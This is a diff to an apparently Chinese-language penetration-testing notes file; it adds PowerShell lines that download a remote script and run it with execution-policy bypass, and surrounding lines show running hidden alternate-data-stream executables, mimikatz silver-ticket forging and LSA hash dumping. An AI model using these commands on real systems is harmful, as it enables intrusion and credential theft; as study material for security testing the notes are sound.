@@ -118,6 +118,10 @@ $plant_txt =  [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase
 下面两个命令可以检查某个可执行文件中是否隐藏木马文件
 Get-Item -Path file.exe -Stream * 在文件file.exe中查找所有stream ，这个stream可能是个隐藏的exe文件,尤其要关注stream和legth字段的值
 接上一行,运行wmic process call create $("c://file.exe:streamname")可以执行包含的streamname文件,通过这种方式可以执行可执行文件中包含的可执行木马文件
+powershell 下载文件 (new-object system.net.webclient).downloadfile("http://www.baidu.com/test.ps1") 或者invoke-webrequest "http//www.baidu.com/test.ps1" -outfile test.ps1
+设置执行策略  powershell -executionpolicy bypass -file .\test.ps1
+
+
 
 Http_header 包含IP的参数:X-Forwarded-For,X-Forwarded-Host,X-Client-IP,X-Remote-IP,X-Remote-Addr,X-Host
 
@@ -276,6 +280,8 @@ GetNPUser.py会完成以上操作。
 	create silver ticket 
 	kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt
   6、mimikatz.exe  dump所有用户hash   ::lsa /patch
+  
+   
   
   使用tcpdump抓包
   tcpdump -A -I eht0 -w /home/test.pacp
